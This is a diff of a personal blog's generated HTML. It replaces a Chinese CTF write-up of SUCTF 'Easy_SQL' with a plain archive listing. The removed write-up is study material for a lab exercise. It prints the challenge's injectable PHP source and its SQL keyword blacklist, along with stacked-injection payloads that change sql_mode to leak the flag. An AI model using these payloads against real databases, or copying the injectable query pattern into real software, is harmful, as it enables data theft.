@@ -6,20 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://www.plasf.cn">
-  <title>Suctf-Easy_SQL-复现总结 | Xiao Leung&#39;s Blog</title>
+  <title>Archives: 2020/4 | Xiao Leung&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="这道题考了mysql的SQL Mode如果没有运维事故把源码泄露了还自己感觉脑洞也有点大。但是有师傅fuzz出来了一个非预期解。 预期解&amp;lt;?php     session_start();      include_once &amp;quot;config.php&amp;quot;;      $post = array();     $get = array();     global $MysqlL">
-<meta name="keywords" content="CTF">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Suctf-Easy_SQL-复现总结">
-<meta property="og:url" content="http://www.plasf.cn/2019/09/01/2019-9-1-Suctf-Easy_SQL-复现总结/index.html">
+  <meta name="description" content="随笔、分享、记录生活">
+<meta name="keywords" content="CTF|网络安全|开发">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Xiao Leung&#39;s Blog">
+<meta property="og:url" content="http://www.plasf.cn/archives/2020/04/index.html">
 <meta property="og:site_name" content="Xiao Leung&#39;s Blog">
-<meta property="og:description" content="这道题考了mysql的SQL Mode如果没有运维事故把源码泄露了还自己感觉脑洞也有点大。但是有师傅fuzz出来了一个非预期解。 预期解&amp;lt;?php     session_start();      include_once &amp;quot;config.php&amp;quot;;      $post = array();     $get = array();     global $MysqlL">
+<meta property="og:description" content="随笔、分享、记录生活">
 <meta property="og:locale" content="cn">
-<meta property="og:updated_time" content="2019-09-01T15:21:26.642Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Suctf-Easy_SQL-复现总结">
-<meta name="twitter:description" content="这道题考了mysql的SQL Mode如果没有运维事故把源码泄露了还自己感觉脑洞也有点大。但是有师傅fuzz出来了一个非预期解。 预期解&amp;lt;?php     session_start();      include_once &amp;quot;config.php&amp;quot;;      $post = array();     $get = array();     global $MysqlL">
+<meta name="twitter:title" content="Xiao Leung&#39;s Blog">
+<meta name="twitter:description" content="随笔、分享、记录生活">
   
     <link rel="alternative" href="/atom.xml" title="Xiao Leung&#39;s Blog" type="application/atom+xml">
   
@@ -152,172 +151,36 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-2019-9-1-Suctf-Easy_SQL-复现总结" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      Suctf-Easy_SQL-复现总结
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2020" class="archive-year">2020</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2020/04/01/MRCTF WP/" class="archive-article-date">
+  	<time datetime="2020-04-01T09:36:26.711Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-01</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2020/04/01/MRCTF WP/">MRCTF WP</a>
     </h1>
   
 
-        
-        <a href="/2019/09/01/2019-9-1-Suctf-Easy_SQL-复现总结/" class="archive-article-date">
-  	<time datetime="2019-09-01T15:08:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>这道题考了mysql的SQL Mode如果没有运维事故把源码泄露了还自己感觉脑洞也有点大。但是有师傅fuzz出来了一个非预期解。</p>
-<h1 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h1><pre><code class="php">&lt;?php
-    session_start();
-
-    include_once &quot;config.php&quot;;
-
-    $post = array();
-    $get = array();
-    global $MysqlLink;
-
-    //GetPara();
-    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);
-    if(!$MysqlLink){
-        die(&quot;Mysql Connect Error!&quot;);
-    }
-    $selectDB = mysqli_select_db($MysqlLink,$dataName);
-    if(!$selectDB){
-        die(&quot;Choose Database Error!&quot;);
-    }
-
-    foreach ($_POST as $k=&gt;$v){
-        if(!empty($v)&amp;&amp;is_string($v)){
-            $post[$k] = trim(addslashes($v));
-        }
-    }
-    foreach ($_GET as $k=&gt;$v){
-        }
-    }
-    //die();
-    ?&gt;
-
-&lt;html&gt;
-&lt;head&gt;
-&lt;/head&gt;
-
-&lt;body&gt;
-
-&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;
-&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
-&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;
-&lt;input type=&quot;submit&quot;&gt;
-&lt;/form&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-
-&lt;?php
-
-    if(isset($post[&#39;query&#39;])){
-        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;
-        //var_dump(preg_match(&quot;/{$BlackList}/is&quot;,$post[&#39;query&#39;]));
-        if(preg_match(&quot;/{$BlackList}/is&quot;,$post[&#39;query&#39;])){
-            //echo $post[&#39;query&#39;];
-            die(&quot;Nonono.&quot;);
-        }
-        if(strlen($post[&#39;query&#39;])&gt;40){
-            die(&quot;Too long.&quot;);
-        }
-        $sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;
-        mysqli_multi_query($MysqlLink,$sql);
-        do{
-            if($res = mysqli_store_result($MysqlLink)){
-                while($row = mysqli_fetch_row($res)){
-                    print_r($row);
-                }
-            }
-        }while(@mysqli_next_result($MysqlLink));
-
-    }
-
-    ?&gt;</code></pre>
-<p>源码泄露如上。可以直接看到执行语句：<code>select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag</code>有一个管道符但是在MYSQL中是不能直接使用管道符的会将<code>||</code>视为运算符。需要设置</p>
-<p>sql_mode为<code>PIPES_AS_CONCA</code>.这里也是一个堆叠注入。payload如下：</p>
-<pre><code class="mysql">1;show databases; #查库
-1;show tables;#查表
-最终payload:
-1;set sql_mode=PIPES_AS_CONCA;select 1</code></pre>
-<h1 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h1><pre><code>*,1</code></pre><p>相关知识：</p>
-<p><strong>1. SQL语法支持类</strong></p>
-<ul>
-<li><p><strong>ONLY_FULL_GROUP_BY</strong>   对于GROUP BY聚合操作，如果在SELECT中的列、HAVING或者ORDER BY子句的列，没有在GROUP BY中出现，那么这个SQL是不合法的。是可以理解的，因为不在 group by 的列查出来展示会有矛盾。<br> 在5.7中默认启用，所以在实施5.6升级到5.7的过程需要注意：</p>
-<pre><code> Expression #1 of SELECT list is not in GROUP BY
-clause and contains nonaggregated column
-&#39;1066export.ebay_order_items.TransactionID&#39; which
-is not functionally dependent on columns in GROUP BY
-clause; this is incompatible with sql_mode=only_full_group_by</code></pre></li>
-<li><p><strong>ANSI_QUOTES</strong>  启用 ANSI_QUOTES 后，不能用双引号来引用字符串，因为它被解释为识别符，作用与 <code>一样。设置它以后，</code>update t set f1=”” …`，会报 Unknown column ‘’ in ‘field list 这样的语法错误。</p>
-</li>
-<li><p><strong>PIPES_AS_CONCAT</strong>   将 <code>||</code> 视为字符串的连接操作符而非 或 运算符，这和Oracle数据库是一样的，也和字符串的拼接函数 CONCAT() 相类似。</p>
-</li>
-<li><p><strong>NO_TABLE_OPTIONS</strong>   使用 <code>SHOW CREATE TABLE</code> 时不会输出MySQL特有的语法部分，如 <code>ENGINE</code> ，这个在使用 mysqldump 跨DB种类迁移的时候需要考虑。</p>
-</li>
-<li><p><strong>NO_AUTO_CREATE_USER</strong>   字面意思不自动创建用户。在给MySQL用户授权时，我们习惯使用 <code>GRANT ... ON ... TO dbuser</code> 顺道一起创建用户。设置该选项后就与oracle操作类似，授权之前必须先建立用户。5.7.7开始也默认了。</p>
-</li>
-</ul>
-<p><strong>2. 数据检查类</strong></p>
-<ul>
-<li><p><strong>NO_ZERO_DATE</strong>   认为日期 ‘0000-00-00’ 非法，与是否设置后面的严格模式有关。</p>
-<ol>
-<li>如果设置了严格模式，则 NO_ZERO_DATE 自然满足。但如果是 INSERT IGNORE 或 UPDATE IGNORE，’0000-00-00’依然允许且只显示warning</li>
-<li>如果在非严格模式下，设置了<code>NO_ZERO_DATE</code>，效果与上面一样，’0000-00-00’允许但显示warning；如果没有设置<code>NO_ZERO_DATE</code>，no warning，当做完全合法的值。</li>
-<li><code>NO_ZERO_IN_DATE</code>情况与上面类似，不同的是控制日期和天，是否可为 0 ，即 <code>2010-01-00</code> 是否合法。</li>
-</ol>
-</li>
-<li><p><strong>NO_ENGINE_SUBSTITUTION</strong>   使用 <code>ALTER TABLE</code>或<code>CREATE TABLE</code> 指定 ENGINE 时， 需要的存储引擎被禁用或未编译，该如何处理。启用<code>NO_ENGINE_SUBSTITUTION</code>时，那么直接抛出错误；不设置此值时，CREATE用默认的存储引擎替代，ATLER不进行更改，并抛出一个 warning .</p>
-</li>
-<li><p><strong>STRICT_TRANS_TABLES</strong> 设置它，表示启用严格模式。<br> 注意 <code>STRICT_TRANS_TABLES</code> 不是几种策略的组合，单独指 <code>INSERT</code>、<code>UPDATE</code>出现少值或无效值该如何处理：</p>
-<ol>
-<li><p>前面提到的把 ‘’ 传给int，严格模式下非法，若启用非严格模式则变成0，产生一个warning</p>
-</li>
-<li><p>Out Of Range，变成插入最大边界值</p>
-</li>
-<li><p>A value is missing when a new row to be inserted does not contain  a value for a non-NULL column that has no explicit DEFAULT clause in  its definition</p>
-</li>
-</ol>
-</li>
-</ul>
-<p>手册：<a href="https://mariadb.com/kb/en/library/sql-mode/" target="_blank" rel="noopener">https://mariadb.com/kb/en/library/sql-mode/</a></p>
-
-      
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -329,115 +192,19 @@ clause; this is incompatible with sql_mode=only_full_group_by</code></pre></li>
 		</ul>
 	</div>
 
-      
+          
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://www.plasf.cn/2019/09/01/2019-9-1-Suctf-Easy_SQL-复现总结/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2019/09/04/2019-9-4-强网杯2019-随便注-复盘总结/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          强网杯2019-随便注-复盘总结
-        
-      </div>
-    </a>
   
   
-    <a href="/2019/08/28/本地上传到github小记/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">本地上传到github小记</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-  
+    </div></section>
   
 
-  
-
-  
-
-  
+    
 
 
           </div>
@@ -464,8 +231,8 @@ clause; this is incompatible with sql_mode=only_full_group_by</code></pre></li>
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
-		isArchive: false,
+		isPost: false,
+		isArchive: true,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
